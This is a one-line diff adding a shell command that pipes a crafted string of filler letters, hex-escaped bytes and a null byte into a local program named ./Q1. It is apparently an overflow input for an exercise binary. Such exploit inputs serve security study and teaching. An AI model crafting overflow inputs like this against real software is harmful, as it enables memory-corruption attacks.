@@ -1,0 +1,1 @@
+echo -e "ABCDEFGHIJKLMN\x49\x51\x55\x55\x55\x55\x00" | ./Q1
